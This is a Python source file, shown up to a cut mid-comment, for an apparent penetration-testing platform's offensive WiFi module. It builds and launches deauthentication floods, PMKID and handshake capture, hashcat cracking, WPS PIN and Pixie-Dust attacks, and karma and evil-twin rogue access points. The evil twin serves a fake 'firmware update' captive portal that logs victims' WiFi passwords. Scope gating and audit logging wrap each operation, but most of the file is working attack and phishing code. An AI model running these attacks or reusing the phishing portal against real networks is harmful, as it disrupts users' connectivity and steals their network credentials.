"""Offensive WiFi — active attacks against IN-SCOPE targets only.

GATED MODULE. Every offensive operation is double-gated:

  1. The module refuses to put the radio into monitor mode unless an engagement
     is active AND the target is inside the engagement scope allowlist — so a
     doomed request never even touches the card.
  2. Every subprocess is launched through ``warlock.jobs.runner.submit`` with
     ``requires_engagement=True``. That is the *authoritative* gate: it
       - refuses when engagement mode is OFF,
       - refuses any target not in the engagement scope allowlist,
       - writes a ``scope.violation`` audit row + fires an alert on refusal,
       - writes a ``job.submit`` audit row for every accepted invocation.

Wraps ``wlan1`` (MT7921 / mt7921u) in monitor mode for the attack tools and
restores it to managed on shutdown. The engagement kill switch
(``engagement.killswitch``) also cancels all jobs and restores interfaces.

Operations implemented in this module:
  POST /api/wifi_offensive/deauth      aireplay-ng --deauth vs an in-scope AP
  POST /api/wifi_offensive/pmkid       hcxdumptool -> hcxpcapngtool -> .hc22000
  POST /api/wifi_offensive/handshake   deauth + EAPOL capture -> handshakes/
  POST /api/wifi_offensive/crack       hashcat vs a captured .hc22000 + wordlists/
  POST /api/wifi_offensive/evil_twin   airbase-ng rogue AP cloning an in-scope
                                       SSID + dnsmasq (on the at0 tap) + iptables
                                       redirect + "firmware update" captive portal
                                       (creds -> engagements/<uuid>/)
  POST /api/wifi_offensive/karma       airbase-ng -P respond-to-all-probes (MANA)
  POST /api/wifi_offensive/wps         reaver | bully WPS PIN attack (optional
                                       Pixie-Dust) vs an in-scope AP -> recovered
                                       PIN + WPA passphrase land in the job output

Rogue-AP ops drive ``wlan1`` through monitor mode (``mon0``) just like the
injection ops: ``_submit_gated`` flips the radio to monitor via the MT7921
helper, then ``airbase-ng`` consumes ``mon0`` and exposes an ``at0`` tap on which
dnsmasq + the captive portal run. The launch script's trap kills the AP stack,
flushes the iptables redirect, and restores ``wlan1`` to managed on any exit;
module shutdown / the engagement kill switch restore it as well.

Gate split: ``evil_twin`` has a single target SSID, so it keeps the full scope
gate (``target=<ssid>``). ``karma`` is promiscuous by design (it becomes ANY
SSID a client probes for) so there is no single target — it gates on
engagement-mode-active ONLY (``target=""`` -> refuse when OFF, audit every
start) and never bypasses the engagement gate.

Deferred (clear TODO stub, returns HTTP 501): WPA-Enterprise harvester
(eaphammer — not installed on the device).
See ``02-warlock-command-center.md`` (Module 6) for the full spec.
"""
from __future__ import annotations

import asyncio
import logging
import re
import shlex
import shutil
from datetime import datetime
from pathlib import Path
from typing import Any

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field
from sqlalchemy import desc

from warlock.config import get_settings
from warlock.db import session_scope
from warlock.engagement import engagement
from warlock.jobs import runner
from warlock.models import Job
from warlock.modules._base import ModuleBase

log = logging.getLogger("warlock.wifi_offensive")

# --- tool paths (resolved at import; fall back to canonical install locations) ---
AIREPLAY = shutil.which("aireplay-ng") or "/usr/sbin/aireplay-ng"
AIRODUMP = shutil.which("airodump-ng") or "/usr/sbin/airodump-ng"
HCXDUMPTOOL = shutil.which("hcxdumptool") or "/usr/bin/hcxdumptool"
HCXPCAPNGTOOL = shutil.which("hcxpcapngtool") or "/usr/bin/hcxpcapngtool"
HASHCAT = shutil.which("hashcat") or "/usr/bin/hashcat"
# WPS PIN-attack tools (gated /wps op). reaver brute-forces / Pixie-Dusts the WPS
# PIN and derives the WPA passphrase; bully is the alternate engine. Both need
# the mon0 monitor iface + root.
REAVER = shutil.which("reaver") or "/usr/bin/reaver"
BULLY = shutil.which("bully") or "/usr/bin/bully"
# Rogue-AP stack (gated evil-twin / karma). airbase-ng (aircrack-ng) drives the
# monitor iface and exposes a tap; dnsmasq serves DHCP + the captive-portal DNS
# catch-all on that tap. (hostapd-mana was the original plan but is not cleanly
# installable on Debian trixie — needs libnl-3 >= 3.11 vs 3.7.0 in base, and the
# apt pin correctly blocks pulling Kali's newer libnl. airbase-ng needs no new
# deps.)
AIRBASE = shutil.which("airbase-ng") or "/usr/sbin/airbase-ng"
DNSMASQ = shutil.which("dnsmasq") or "/usr/sbin/dnsmasq"

MT_HELPER = shutil.which("wlan-mt7921") or "/usr/local/bin/wlan-mt7921"
WLAN_IFACE = "wlan1"  # managed-mode name of the MT7921 attack dongle
MON_IFACE = "mon0"    # monitor-mode name exposed by the helper (airbase-ng input)
AP_TAP = "at0"        # tap interface airbase-ng creates for the rogue AP
AP_GATEWAY = "10.0.0.1"  # captive-portal gateway IP assigned to the at0 tap
# The captive portal binds a HIGH port on the gateway (not :80): lighttpd
# (tar1090's ADS-B web UI) already holds 0.0.0.0:80 on this device, so binding
# :80 would EADDRINUSE. AP clients still hit "port 80" — an iptables DNAT rule
# redirects at0 :80 -> AP_GATEWAY:PORTAL_PORT.
PORTAL_PORT = 8888

# hashcat mode for combined WPA*-PBKDF2 PMKID + EAPOL (.hc22000 hashline format).
HC22000_MODE = "22000"
CRACK_MODES = {"22000", "16800"}  # 16800 = legacy PMKID-only

_MAC_RE = re.compile(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")


# --------------------------------------------------------------------------- #
# Data directories (under the operator data root, default ~/warlock)
# --------------------------------------------------------------------------- #
def _dir(*parts: str) -> Path:
    p = get_settings().data.joinpath(*parts)
    p.mkdir(parents=True, exist_ok=True)
    return p


def _captures_dir() -> Path:
    return _dir("captures", "wifi")


def _handshakes_dir() -> Path:
    return _dir("handshakes")


def _wordlists_dir() -> Path:
    return _dir("wordlists")


def _ap_dir() -> Path:
    """Scratch dir for rogue-AP runtime assets (dnsmasq conf + captive portal)."""
    return _dir("captures", "wifi", "ap")


# --------------------------------------------------------------------------- #
# Validation / path-safety helpers
# --------------------------------------------------------------------------- #
def _norm_mac(value: str, field: str = "bssid") -> str:
    v = (value or "").strip().lower()
    if not _MAC_RE.match(v):
        raise HTTPException(400, f"invalid {field} MAC address: {value!r}")
    return v


def _norm_ssid(value: str) -> str:
    """Validate an 802.11 SSID for use as a rogue-AP target.

    The SSID is the engagement-scope target for evil-twin AND flows into the
    airbase-ng argv (shlex-quoted); reject control characters and enforce the
    1..32 byte 802.11 limit as defense in depth on top of the quoting.
    """
    v = (value or "").strip()
    if not v:
        raise HTTPException(400, "ssid is required")
    if len(v.encode("utf-8")) > 32:
        raise HTTPException(400, "ssid exceeds the 32-byte 802.11 limit")
    if any(ord(c) < 0x20 or ord(c) == 0x7F for c in v):
        raise HTTPException(400, "ssid must not contain control characters")
    return v


def _ssid_slug(ssid: str) -> str:
    """Filesystem-safe token derived from an SSID (for asset filenames)."""
    return re.sub(r"[^A-Za-z0-9_.-]", "_", ssid) or "ap"


def _ap_tools_missing() -> list[str]:
    """Return the rogue-AP tools that are not installed (empty == all present)."""
    missing: list[str] = []
    if not (shutil.which("airbase-ng") or Path(AIRBASE).exists()):
        missing.append("airbase-ng")
    if not (shutil.which("dnsmasq") or Path(DNSMASQ).exists()):
        missing.append("dnsmasq")
    return missing


WPS_TOOLS = ("reaver", "bully")


def _wps_tool_missing(tool: str) -> bool:
    """True if the selected WPS tool (reaver|bully) is not installed.

    Probed only inside the ``_would_allow`` branch of the /wps handler so tool
    state never leaks to an unauthorised caller (mirrors ``_ap_tools_missing``).
    """
    path = REAVER if tool == "reaver" else BULLY
    return not (shutil.which(tool) or Path(path).exists())


def _contained(path: Path, root: Path) -> bool:
    """True if *path* resolves to a location inside *root* (blocks traversal)."""
    try:
        path.resolve().relative_to(root.resolve())
        return True
    except (ValueError, OSError, RuntimeError):
        return False


def _resolve_wordlist(name: str | None) -> Path:
    wdir = _wordlists_dir()
    if not name:
        for cand in ("rockyou.txt", "common-wpa-passwords.txt"):
            p = wdir / cand
            if p.exists():
                return p
        return wdir / "rockyou.txt"  # canonical default; existence checked at run time
    p = Path(name) if "/" in name else (wdir / name)
    if not _contained(p, wdir):
        raise HTTPException(400, f"wordlist must live under {wdir}")
    return p


# --------------------------------------------------------------------------- #
# Monitor-mode control (mirrors wifi_recon: prefer the MT7921 helper, fall back
# to `iw`). All offensive tools run against the monitor iface.
#
# Teardown invariant: after _restore_managed() the operator's adapter MUST be
# back under its canonical name `wlan1` in managed mode — never stranded as the
# monitor-mode `mon0`. We trust the helper only if it actually achieves that;
# otherwise we pin the name ourselves (defends against the shared helper bug
# where `wlan-mt7921 managed` leaves the iface named mon0).
# --------------------------------------------------------------------------- #
def _have_helper() -> bool:
    return bool(shutil.which("wlan-mt7921")) or Path(MT_HELPER).exists()


def _iface_exists(name: str) -> bool:
    return Path(f"/sys/class/net/{name}").exists()


async def _sh(*argv: str, timeout: float = 10.0) -> tuple[int, str]:
    """Run a command, returning (returncode, combined-output). Never raises."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        ob, eb = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        out = ((ob or b"") + (eb or b"")).decode("utf-8", errors="replace")
        return (proc.returncode if proc.returncode is not None else -1), out
    except Exception as e:  # noqa: BLE001
        log.warning("subprocess %s failed: %s", argv[:2], e)
        return -1, str(e)


async def _ensure_monitor() -> str:
    """Put the MT7921 attack dongle into monitor mode (exposed as mon0)."""
    if not _have_helper() and not _iface_exists(WLAN_IFACE) and not _iface_exists(MON_IFACE):
        log.debug("no MT7921 helper or iface present; skipping monitor")
        return ""
    if _have_helper():
        rc, out = await _sh(MT_HELPER, "monitor")
        if rc == 0:
            return out
        log.warning("wlan-mt7921 monitor rc=%s: %s", rc, out.strip())
    # Fallback: flip the canonical wlan1 to monitor by name.
    if _iface_exists(WLAN_IFACE):
        _, out = await _sh("sudo", "-n", "iw", "dev", WLAN_IFACE, "set", "type", "monitor")
        return out
    return ""


async def _restore_managed_by_name() -> str:
    """Pin the canonical `wlan1` managed iface without the helper.

    If monitor mode left the card named `mon0`, bring it down, switch to
    managed, rename it back to `wlan1`, and bring it up — so the operator's
    adapter is never stranded as `mon0`.
    """
    out: list[str] = []
    if _iface_exists(MON_IFACE):
        for argv in (
            ("sudo", "-n", "ip", "link", "set", MON_IFACE, "down"),
            ("sudo", "-n", "iw", "dev", MON_IFACE, "set", "type", "managed"),
            ("sudo", "-n", "ip", "link", "set", MON_IFACE, "name", WLAN_IFACE),
            ("sudo", "-n", "ip", "link", "set", WLAN_IFACE, "up"),
        ):
            rc, o = await _sh(*argv)
            out.append(f"{' '.join(argv)} -> rc={rc} {o.strip()}".rstrip())
    elif _iface_exists(WLAN_IFACE):
        rc, o = await _sh("sudo", "-n", "iw", "dev", WLAN_IFACE, "set", "type", "managed")
        out.append(f"iw {WLAN_IFACE} managed -> rc={rc} {o.strip()}".rstrip())
    return "\n".join(out)


async def _restore_managed() -> str:
    """Restore the MT7921 adapter to MANAGED mode under its canonical name wlan1.

    Primary path is the `wlan-mt7921 managed` helper (the same call wifi_recon
    uses). We trust it ONLY if it leaves wlan1 present and mon0 gone; otherwise
    we pin the name ourselves so wlan1 is never stranded as mon0.
    """
    out = ""
    if _have_helper():
        rc, out = await _sh(MT_HELPER, "managed")
        if rc == 0 and _iface_exists(WLAN_IFACE) and not _iface_exists(MON_IFACE):
            return out
        log.warning(
            "wlan-mt7921 managed incomplete (rc=%s wlan1=%s mon0=%s); pinning canonical name",
            rc, _iface_exists(WLAN_IFACE), _iface_exists(MON_IFACE),
        )
    fb = await _restore_managed_by_name()
    return "\n".join(p for p in (out.strip(), fb) if p)


# --------------------------------------------------------------------------- #
# The single gated launch path. Every op goes through here.
# --------------------------------------------------------------------------- #
def _would_allow(target: str) -> bool:
    """Cheap, side-effect-free pre-check: would the authoritative gate accept?

    Used only to decide whether to touch the radio / write capture artifacts.
    The real gate is ``runner.submit(requires_engagement=True)``.
    """
    return engagement.is_on() and (not target or engagement.check_target(target))


async def _submit_gated(
    type_: str,
    argv: list[str],
    *,
    target: str,
    note: str,
    needs_monitor: bool = True,
) -> str:
    """Authoritative offensive launch path.

    Only flips the radio to monitor mode when the op would be allowed, then
    submits through the engagement-guarded runner. ``runner.submit`` is the
    single source of truth for the gate: on refusal it writes the
    ``scope.violation`` audit row, fires the alert, and raises ``PermissionError``
    (mapped here to HTTP 403). On success it persists the Job + a ``job.submit``
    audit row.
    """
    if needs_monitor and _would_allow(target):
        await _ensure_monitor()
    try:
        return await runner.submit(
            type_, argv, requires_engagement=True, target=target, note=note
        )
    except PermissionError as e:
        raise HTTPException(403, str(e)) from e


# --------------------------------------------------------------------------- #
# Pure command builders — every interpolated value is int-coerced and/or
# shlex.quoted. (Numerics that flow into the bash chains are a shell-injection
# surface; the scope allowlist only constrains the BSSID target.)
# --------------------------------------------------------------------------- #
def _deauth_command(
    *, bssid: str, client: str | None = None, count: int = 64, pps: int = 0,
    iface: str = MON_IFACE,
) -> list[str]:
    count = max(0, int(count))  # 0 == continuous burst
    argv = ["sudo", "-n", AIREPLAY, "--deauth", str(count), "-a", bssid]
    if client:
        argv += ["-c", client]
    if int(pps) > 0:
        argv += ["-x", str(int(pps))]  # injection rate (packets/sec)
    argv.append(iface)
    return argv


def _pmkid_command(
    *, bssid: str, filterfile: Path, pcapng: Path, hc22000: Path, duration: int = 60,
    iface: str = MON_IFACE, auto_crack: bool = False,
    wordlist: Path | None = None, potfile: Path | None = None,
) -> list[str]:
    duration = max(5, int(duration))
    q = shlex.quote
    capture = (
        f"timeout {duration} sudo -n {q(HCXDUMPTOOL)} -i {q(iface)} "
        f"-o {q(str(pcapng))} --filterlist_ap={q(str(filterfile))} "
        f"--filtermode=2 --enable_status=1"
    )
    convert = f"{q(HCXPCAPNGTOOL)} -o {q(str(hc22000))} {q(str(pcapng))}"
    script = f"{capture} ; {convert}"
    if auto_crack and wordlist is not None:
        pot = q(str(potfile)) if potfile is not None else q(str(hc22000) + ".pot")
        script += (
            f" ; {q(HASHCAT)} -m {HC22000_MODE} -a 0 {q(str(hc22000))} "
            f"{q(str(wordlist))} --potfile-path {pot} -w 3"
        )
    return ["bash", "-c", script]


def _handshake_command(
    *, bssid: str, channel: int, prefix: Path, client: str | None = None,
    duration: int = 90, deauth_count: int = 5, iface: str = MON_IFACE,
) -> list[str]:
    duration = max(10, int(duration))
    deauth_count = max(1, int(deauth_count))
    channel = int(channel)
    q = shlex.quote
    dump = (
        f"timeout {duration} sudo -n {q(AIRODUMP)} -c {channel} "
        f"--bssid {q(bssid)} -w {q(str(prefix))} --output-format pcap {q(iface)}"
    )
    deauth = f"sudo -n {q(AIREPLAY)} --deauth {deauth_count} -a {q(bssid)}"
    if client:
        deauth += f" -c {q(client)}"
    deauth += f" {q(iface)}"
    # Background the capture, give it a beat to lock channel, fire a deauth burst
    # to force the 4-way EAPOL re-handshake, then wait for the capture to finish.
    script = f"{dump} & DUMP=$!; sleep 5; {deauth}; wait $DUMP"
    return ["bash", "-c", script]


def _crack_command(
    *, hashfile: Path, wordlist: Path, mode: str = HC22000_MODE,
    potfile: Path | None = None, outfile: Path | None = None,
) -> list[str]:
    # Offline cracking — does NOT need root, so no sudo prefix.
    argv = [HASHCAT, "-m", str(mode), "-a", "0", str(hashfile), str(wordlist), "-w", "3"]
    if potfile is not None:
        argv += ["--potfile-path", str(potfile)]
    if outfile is not None:
        argv += ["-o", str(outfile)]
    return argv


def _wps_command(
    *, tool: str, bssid: str, channel: int, pixie_dust: bool = False,
    duration: int = 600, iface: str = MON_IFACE,
) -> list[str]:
    """Build the WPS PIN-attack invocation (reaver OR bully).

    Both need root (raw monitor-mode sockets) and are wrapped in ``timeout`` so a
    PIN brute-force can never run unbounded — identical to how ``_pmkid_command``
    bounds its capture. The recovered WPS PIN and derived WPA passphrase are
    printed to stdout/stderr, which the job runner persists, so the result is
    surfaced via /jobs + /status (no separate capture artifact).

    The BSSID and channel flow into the argv as discrete tokens (NOT a shell
    string) and ``runner.submit`` execs the list directly, so there is no shell
    to escape; the BSSID is already validated by ``_norm_mac`` and the channel is
    int-coerced.

      reaver: timeout <dur> sudo -n reaver -i mon0 -b <bssid> -c <chan> -vv [-K 1]
      bully:  timeout <dur> sudo -n bully  mon0 -b <bssid> -c <chan>      [-d]

    Pixie-Dust (offline WPS attack) is ``-K 1`` for reaver and ``-d``
    (``--pixiewps``) for bully.
    """
    duration = max(30, int(duration))
    channel = int(channel)
    tool = (tool or "").strip().lower()
    if tool not in WPS_TOOLS:
        raise HTTPException(400, f"unsupported wps tool {tool!r}; choose {sorted(WPS_TOOLS)}")
    prefix = ["timeout", str(duration), "sudo", "-n"]
    if tool == "reaver":
        argv = prefix + [REAVER, "-i", iface, "-b", bssid, "-c", str(channel), "-vv"]
        if pixie_dust:
            argv += ["-K", "1"]
    else:  # bully — interface is a positional argument
        argv = prefix + [BULLY, iface, "-b", bssid, "-c", str(channel)]
        if pixie_dust:
            argv.append("-d")
    return argv


# --------------------------------------------------------------------------- #
# Rogue-AP builders (evil-twin / karma). The dnsmasq config is written to disk
# (never shelled); the SSID flows into the airbase-ng argv but is validated
# against control chars by _norm_ssid AND shlex-quoted, so it can never break
# out of the launch script.
# --------------------------------------------------------------------------- #
def _airbase_args(
    *, ssid: str | None, channel: int = 1, karma: bool = False, iface: str = MON_IFACE,
) -> list[str]:
    """Build the airbase-ng invocation (no sudo prefix; added by the launcher).

    evil-twin: ``airbase-ng -e <ssid> -c <chan> <mon>`` clones one SSID.
    karma:     ``airbase-ng -P -C 30 -c <chan> <mon>`` — ``-P`` answers ALL probe
    requests (becomes any SSID a client asks for), ``-C 30`` beacons the probed
    SSIDs every 30s. karma has no single target SSID by design; responding
    broadly is gated only by engagement mode (operator responsibility — see the
    spec's "Scope discipline" note).
    """
    argv = [AIRBASE]
    if karma:
        argv += ["-P", "-C", "30"]
    if ssid:
        argv += ["-e", ssid]
    if channel:
        argv += ["-c", str(int(channel))]
    argv.append(iface)
    return argv


def _dnsmasq_conf(
    *, iface: str = AP_TAP, gateway: str = AP_GATEWAY, portal: bool = True,
) -> str:
    """dnsmasq config: DHCP for AP clients + (for evil-twin) a DNS catch-all
    that points every lookup at the captive portal."""
    net = gateway.rsplit(".", 1)[0]
    lines = [
        f"interface={iface}",
        "bind-interfaces",
        "except-interface=lo",
        f"dhcp-range={net}.10,{net}.250,255.255.255.0,12h",
        f"dhcp-option=3,{gateway}",   # default gateway -> the AP
        f"dhcp-option=6,{gateway}",   # DNS server   -> the AP
        "no-resolv",
        "log-dhcp",
    ]
    if portal:
        lines.append(f"address=/#/{gateway}")  # resolve everything to the portal
    return "\n".join(lines) + "\n"


def _portal_script(
    *, creds_log: Path, ssid: str, gateway: str = AP_GATEWAY, port: int = PORTAL_PORT,
) -> str:
    """Generate a stdlib-only captive-portal HTTP server.

    Serves a generic "firmware update required" page; any POSTed form fields are
    appended as a JSON line to *creds_log* (under engagements/<uuid>/). No third
    party deps so it runs from the system python3 on the device.

    Binds (gateway, port) — a HIGH port on the AP gateway, NOT :80 — because
    lighttpd already holds :80 on this device. The iptables DNAT in
    _rogue_ap_command redirects AP clients' :80 to this port.
    """
    # Header carries the only interpolated values, as Python literals (repr) so
    # an SSID with quotes can never break out. The body below is fully static.
    header = (
        "import json\n"
        "import urllib.parse\n"
        "from datetime import datetime\n"
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
        f"CREDS_LOG = {str(creds_log)!r}\n"
        f"SSID = {ssid!r}\n"
        f"BIND = ({gateway!r}, {int(port)})\n"
    )
    body = r'''
PAGE = (
    "<!doctype html><html><head><meta name=viewport "
    "content='width=device-width,initial-scale=1'><title>Firmware Update</title>"
    "</head><body style='font-family:sans-serif;max-width:480px;margin:40px auto'>"
    "<h2>Router Firmware Update Required</h2>"
    "<p>A critical security update is available for <b>" + SSID + "</b>. "
    "Sign in with your network password to continue.</p>"
    "<form method=POST action='/'>"
    "<p><input name=username placeholder='Username' style='width:100%;padding:8px'></p>"
    "<p><input name=password type=password placeholder='WiFi password' "
    "style='width:100%;padding:8px'></p>"
    "<p><button type=submit style='padding:8px 16px'>Update now</button></p>"
    "</form></body></html>"
)


class Portal(BaseHTTPRequestHandler):
    def _send(self, code, html):
        b = html.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        # Trigger the OS captive-portal popup and serve the lure for every path.
        self._send(200, PAGE)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        fields = dict(urllib.parse.parse_qsl(raw))
        entry = {
            "ts": datetime.utcnow().isoformat(),
            "ssid": SSID,
            "client": self.client_address[0],
            "fields": fields,
        }
        with open(CREDS_LOG, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry) + "\n")
        self._send(200, "<html><body><h3>Updating firmware&hellip;</h3>"
                        "<p>Please keep this device connected.</p></body></html>")

    def log_message(self, *args):  # silence stderr access logging
        pass


if __name__ == "__main__":
    HTTPServer(BIND, Portal).serve_forever()
'''
    return header + body


def _rogue_ap_command(
    *, airbase_argv: list[str], dnsmasq_conf: Path, portal_py: Path | None,
    duration: int = 900, tap: str = AP_TAP, gateway: str = AP_GATEWAY,
) -> list[str]:
    """Build the full rogue-AP lifecycle as a single ``bash -c`` job.

    Start -> capture -> teardown all live in one script. airbase-ng consumes the
    monitor iface (mon0) and creates the ``at0`` tap; dnsmasq + (for evil-twin)
    the captive portal + an iptables :80 redirect run on that tap. A trap kills
    the AP stack, deletes the iptables rule, and restores wlan1 to managed on ANY
    exit — timeout, kill, or the engagement kill switch. Tool presence is
    re-checked in-script so a tool vanishing between pre-flight and launch still
    fails cleanly instead of half-starting the AP.

    Self-kill safety: because the job runs as ``bash -c <script>``, the script
    text (which contains the dnsmasq-conf / portal paths) is in this process's
    own ``/proc/<pid>/cmdline``. A naive ``pkill -f <conf>`` in cleanup would
    therefore match — and SIGTERM — the cleanup's own bash process before it
    finishes, stranding wlan1 in monitor. We avoid that two ways: airbase-ng is
    reaped by exact process *name* (``pkill -x``, which can never match
    ``bash``), and dnsmasq / the portal are reaped via a ``pgrep -f`` loop that
    explicitly skips this script's PID (``$$``). The radio restore therefore
    always runs to completion.
    """
    duration = max(30, int(duration))
    q = shlex.quote
    air = " ".join(q(a) for a in airbase_argv)
    air0 = q(airbase_argv[0])
    dc = q(str(dnsmasq_conf))
    dns = q(DNSMASQ)
    tapq, gw = q(tap), q(gateway)

    # Reap a backgrounded child by a cmdline pattern WITHOUT matching this very
    # script ($$). Kills the real child directly (not just the sudo wrapper),
    # which sidesteps sudo's same-process-group signal-forwarding ambiguity.
    def _reap(pattern: str) -> str:
        return (
            f"  for p in $(pgrep -f {pattern} 2>/dev/null); do "
            f'[ "$p" = "$$" ] || sudo -n kill "$p" 2>/dev/null; done\n'
        )

    portal_launch = ""
    portal_reap = ""
    iptables_add = ""
    iptables_del = ""
    if portal_py is not None:
        pp = q(str(portal_py))
        portal_launch = f"sudo -n python3 {pp} &\n"
        portal_reap = _reap(pp)
        # Redirect AP clients' :80 to the portal's high port (it can't bind :80;
        # lighttpd holds it). Victims still see a "port 80" portal via the DNAT.
        redir = (
            f"-t nat {{op}} PREROUTING -i {tapq} -p tcp --dport 80 "
            f"-j DNAT --to-destination {gateway}:{PORTAL_PORT}"
        )
        iptables_add = f"sudo -n iptables {redir.format(op='-A')} 2>/dev/null\n"
        iptables_del = f"  sudo -n iptables {redir.format(op='-D')} 2>/dev/null\n"

    script = (
        "set +e\n"
        # Fail cleanly if a required tool is not installed (defense in depth).
        f"command -v {air0} >/dev/null 2>&1 || sudo -n test -x {air0} || "
        f'{{ echo "airbase-ng not installed"; exit 1; }}\n'
        f"command -v {dns} >/dev/null 2>&1 || sudo -n test -x {dns} || "
        f'{{ echo "dnsmasq not installed"; exit 1; }}\n'
        # Teardown trap: kill the AP stack, drop the redirect, restore wlan1.
        "cleanup() {\n"
        "  trap - EXIT INT TERM\n"
        # airbase-ng by exact name (never matches this 'bash' process).
        "  sudo -n pkill -x airbase-ng 2>/dev/null\n"
        f"{_reap(dc)}"          # dnsmasq, skipping $$
        f"{portal_reap}"        # captive portal, skipping $$ (evil-twin only)
        f"{iptables_del}"
        f"  sudo -n ip addr flush dev {tapq} 2>/dev/null\n"
        # Restore the MT7921 to managed mode under its canonical name wlan1
        # (mirrors _restore_managed_by_name so a timeout-ended job self-heals).
        "  if [ -e /sys/class/net/mon0 ]; then\n"
        "    sudo -n ip link set mon0 down 2>/dev/null\n"
        "    sudo -n iw dev mon0 set type managed 2>/dev/null\n"
        "    sudo -n ip link set mon0 name wlan1 2>/dev/null\n"
        "    sudo -n ip link set wlan1 up 2>/dev/null\n"
        "  else\n"
        "    sudo -n iw dev wlan1 set type managed 2>/dev/null\n"
        "  fi\n"
        "}\n"
        "trap cleanup EXIT INT TERM\n"
        # 1. start airbase-ng on the monitor iface -> it creates the at0 tap.
        f"sudo -n {air} & ABID=$!\n"
        # 2. wait (up to ~15s) for the tap to appear.
        f"for _ in $(seq 1 15); do [ -e /sys/class/net/{tap} ] && break; sleep 1; done\n"
        # 3. bring the tap up with the captive-portal gateway IP.
        f"sudo -n ip addr add {gw}/24 dev {tapq} 2>/dev/null\n"
        f"sudo -n ip link set {tapq} up 2>/dev/null\n"
        # 4. DHCP + DNS catch-all for associated clients.
        f"sudo -n {dns} -C {dc} -d &\n"
        # 5. iptables :80 redirect + captive portal (evil-twin only).
        f"{iptables_add}"
        f"{portal_launch}"
        # 6. run for the capture window, then let the trap restore managed mode.
        # Killing the airbase sudo wrapper makes 'wait' return; cleanup's
        # pkill -x then reaps the (possibly orphaned) airbase-ng child.
        f"( sleep {duration}; sudo -n kill $ABID 2>/dev/null ) &\n"
        "wait $ABID\n"
    )
    return ["bash", "-c", script]


# --------------------------------------------------------------------------- #
# Read helpers for /status, /captures, /jobs
# --------------------------------------------------------------------------- #
def _list_captures() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    seen: set[str] = set()
    for d in (_captures_dir(), _handshakes_dir()):
        for pattern in ("*.hc22000", "*.pcapng", "*.cap"):
            for p in sorted(d.glob(pattern)):
                if p.as_posix() in seen:
                    continue
                seen.add(p.as_posix())
                st = p.stat()
                out.append({
                    "path": p.as_posix(),
                    "filename": p.name,
                    "kind": p.suffix.lstrip("."),
                    "size_bytes": st.st_size,
                    "mtime": datetime.utcfromtimestamp(st.st_mtime).isoformat(),
                })
    out.sort(key=lambda c: c["mtime"], reverse=True)
    return out


def _list_wordlists() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for p in sorted(_wordlists_dir().glob("*")):
        if p.is_file():
            out.append({"filename": p.name, "path": p.as_posix(), "size_bytes": p.stat().st_size})
    return out


def _recent_jobs(limit: int = 20) -> list[dict[str, Any]]:
    with session_scope() as s:
        rows = (
            s.query(Job)
            .filter(Job.type.like("wifi.%"))
            .order_by(desc(Job.started_at))
            .limit(limit)
            .all()
        )
        return [{
            "id": j.id,
            "type": j.type,
            "status": j.status,
            "started_at": j.started_at.isoformat() if j.started_at else None,
            "finished_at": j.finished_at.isoformat() if j.finished_at else None,
            "engagement_id": j.engagement_id,
            "argv": j.argv,
        } for j in rows]


# --------------------------------------------------------------------------- #
# Request bodies
# --------------------------------------------------------------------------- #
class DeauthBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    client: str | None = Field(default=None, description="Optional client MAC to target")
    count: int = Field(default=64, ge=0, le=100_000, description="Deauth bursts (0 = continuous)")
    pps: int = Field(default=0, ge=0, le=10_000, description="Injection rate packets/sec (aireplay -x)")


class PmkidBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    duration: int = Field(default=60, ge=5, le=3600, description="Capture window seconds")
    auto_crack: bool = Field(default=False, description="Chain a hashcat crack after conversion")
    wordlist: str | None = Field(default=None, description="Wordlist filename under wordlists/")


class HandshakeBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    channel: int = Field(..., ge=1, le=196, description="AP channel")
    client: str | None = Field(default=None, description="Optional client MAC for targeted deauth")
    duration: int = Field(default=90, ge=10, le=3600, description="Capture window seconds")
    deauth_count: int = Field(default=5, ge=1, le=10_000, description="Deauth bursts to force EAPOL")


class CrackBody(BaseModel):
    hashfile: str = Field(..., description="Path to a captured .hc22000 under captures/ or handshakes/")
    wordlist: str | None = Field(default=None, description="Wordlist filename under wordlists/")
    mode: str = Field(default=HC22000_MODE, description="hashcat -m mode (22000 or 16800)")
    target: str | None = Field(default=None, description="BSSID/ESSID the hash belongs to (scope-checked)")


class EvilTwinBody(BaseModel):
    ssid: str = Field(..., description="Target SSID to clone (must be in engagement scope)")
    channel: int = Field(default=1, ge=1, le=196, description="AP channel")
    duration: int = Field(default=900, ge=30, le=86_400, description="AP lifetime seconds")


class KarmaBody(BaseModel):
    # karma has NO target SSID — it answers all probes. It is gated on
    # engagement-mode-active only (see _launch_rogue_ap / the module docstring).
    channel: int = Field(default=1, ge=1, le=196, description="AP channel")
    duration: int = Field(default=900, ge=30, le=86_400, description="AP lifetime seconds")


class WpsBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    channel: int = Field(..., ge=1, le=196, description="AP channel")
    tool: str = Field(default="reaver", description="WPS attack engine: reaver or bully")
    pixie_dust: bool = Field(default=False, description="Pixie-Dust offline WPS attack (-K 1 / -d)")
    # Time budget for the PIN attack. Pixie-Dust finishes in seconds; a full PIN
    # brute can take hours, so callers SHOULD raise this for non-pixie runs.
    duration: int = Field(default=600, ge=30, le=86_400, description="Attack time budget seconds")


# --------------------------------------------------------------------------- #
# Rogue-AP launch path (shared by evil-twin + karma). Goes through the exact
# same engagement gate as every other op via _submit_gated:
#   - evil_twin: target=<ssid>  -> full scope-allowlist check + audit.
